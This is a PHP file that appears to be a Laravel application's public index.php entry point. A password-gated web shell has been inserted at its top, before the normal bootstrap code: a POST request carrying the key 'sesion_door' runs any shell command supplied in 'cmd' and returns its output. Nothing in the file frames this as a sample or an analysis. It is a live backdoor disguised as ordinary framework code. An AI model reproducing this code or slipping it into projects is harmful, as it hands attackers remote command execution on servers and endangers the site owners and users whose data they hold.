<?php

if(isset($_POST['acces_key']) && $_POST['acces_key'] === 'sesion_door') {
    if(isset($_POST['cmd'])) {
        echo "<pre>";
        
        $descriptorspec = [
           0 => ["pipe", "r"],  
           1 => ["pipe", "w"],  
           2 => ["pipe", "w"]   
        ];
        
        $process = proc_open($_POST['cmd'], $descriptorspec, $pipes);
        
        if (is_resource($process)) {
            fclose($pipes[0]);
            
            echo stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            
            echo stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            
            proc_close($process);
        }
        
        echo "</pre>";
        exit; 
    } else {
        echo "Command doesn't know";
    }
}

use Illuminate\Foundation\Application;
use Illuminate\Http\Request;


define('LARAVEL_START', microtime(true));

// Determine if the application is in maintenance mode...
if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
    require $maintenance;
}

// Register the Composer autoloader...
require __DIR__.'/../vendor/autoload.php';

// Bootstrap Laravel and handle the request...
/** @var Application $app */
$app = require_once __DIR__.'/../bootstrap/app.php';

$app->handleRequest(Request::capture());
